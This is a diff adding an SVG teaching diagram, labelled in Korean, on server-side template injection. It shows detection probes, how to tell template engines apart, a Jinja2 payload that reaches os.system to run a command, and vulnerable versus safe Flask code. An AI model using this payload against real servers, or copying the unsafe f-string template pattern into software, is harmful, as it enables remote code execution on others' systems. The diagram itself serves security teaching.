@@ -1,0 +1,48 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="480" viewBox="0 0 880 480">
+  <rect width="880" height="480" fill="#0a0a0a" rx="12"/>
+
+  <text x="440" y="46" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="22" font-weight="700" fill="#e8e8e8">SSTI: 서버 사이드 템플릿 인젝션</text>
+  <text x="440" y="72" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" fill="#888">사용자 입력이 템플릿으로 처리될 때 서버에서 임의 코드 실행</text>
+
+  <!-- Detection phase -->
+  <text x="180" y="106" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#e8e8e8">① 탐지 (수식 삽입)</text>
+
+  <rect x="60" y="116" width="240" height="100" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1.5"/>
+  <text xml:space="preserve" x="80" y="140" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># 입력값 테스트</text>
+  <text xml:space="preserve" x="80" y="160" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#ce9178">{{7*7}}</text>
+  <text xml:space="preserve" x="80" y="180" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#ffffff">→ 응답에 "49" 표시</text>
+  <text xml:space="preserve" x="80" y="200" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#55c555">→ SSTI 취약점 확인!</text>
+
+  <!-- Engine identification -->
+  <text x="500" y="106" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#e8e8e8">② 엔진 판별</text>
+
+  <rect x="350" y="116" width="470" height="100" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1.5"/>
+  <text xml:space="preserve" x="370" y="140" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8">Jinja2 (Python):   {{7*'7'}} → 7777777</text>
+  <text xml:space="preserve" x="370" y="160" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8">Twig  (PHP):       {{7*'7'}} → 49</text>
+  <text xml:space="preserve" x="370" y="180" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8">FreeMarker (Java): ${7*7} → 49</text>
+  <text xml:space="preserve" x="370" y="200" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8">Smarty (PHP):      {7*7} → 49</text>
+
+  <!-- Jinja2 RCE payload -->
+  <text x="440" y="244" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#e8e8e8">③ Jinja2 RCE 페이로드</text>
+
+  <rect x="60" y="256" width="760" height="82" rx="8" fill="#000000" stroke="#e05555" stroke-width="1.5"/>
+  <text xml:space="preserve" x="80" y="280" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># Python 내부 클래스 체인으로 os.system 접근</text>
+  <text xml:space="preserve" x="80" y="300" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">{{"".__class__.__mro__[1].__subclasses__()[198].__init__</text>
+  <text xml:space="preserve" x="80" y="320" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">.__globals__["__builtins__"]["__import__"]("os").system("id")}}</text>
+
+  <!-- Vulnerable code -->
+  <text x="220" y="368" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" font-weight="600" fill="#e05555">취약 코드</text>
+
+  <rect x="60" y="380" width="320" height="76" rx="8" fill="#000000" stroke="#e05555" stroke-width="1.5"/>
+  <text xml:space="preserve" x="80" y="400" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># Flask + Jinja2</text>
+  <text xml:space="preserve" x="80" y="420" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">template = f"Hello {name}!"  # 위험</text>
+  <text xml:space="preserve" x="80" y="440" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">render_template_string(template)</text>
+
+  <!-- Safe code -->
+  <text x="640" y="368" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" font-weight="600" fill="#55c555">안전 코드</text>
+
+  <rect x="420" y="380" width="400" height="76" rx="8" fill="#000000" stroke="#55c555" stroke-width="1.5"/>
+  <text xml:space="preserve" x="440" y="400" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># 데이터로 전달 (렌더링 분리)</text>
+  <text xml:space="preserve" x="440" y="420" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#55c555">template = "Hello {{ name }}!"</text>
+  <text xml:space="preserve" x="440" y="440" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#55c555">render_template_string(template, name=name)</text>
+</svg>
